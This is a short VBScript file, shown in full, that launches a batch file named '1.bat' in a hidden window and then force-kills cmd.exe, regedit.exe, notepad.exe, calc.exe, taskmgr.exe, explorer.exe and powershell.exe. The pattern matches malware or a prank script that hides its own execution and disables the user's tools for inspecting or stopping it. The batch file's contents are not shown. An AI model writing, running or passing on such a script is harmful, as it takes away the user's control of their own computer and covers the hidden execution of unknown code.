set ws=createobject("wscript.shell")

ws.run"1.bat",0,false

ws.run"cmd /c start /min taskkill /f /im cmd.exe",0,false
ws.run"cmd /c start /min taskkill /f /im regedit.exe",0,false
ws.run"cmd /c start /min taskkill /f /im notepad.exe",0,false
ws.run"cmd /c start /min taskkill /f /im calc.exe",0,false
ws.run"cmd /c start /min taskkill /f /im taskmgr.exe",0,false
ws.run"cmd /c start /min taskkill /f /im explorer.exe",0,false
ws.run"cmd /c start /min taskkill /f /im powershell.exe",0,false

set ws = Nothing
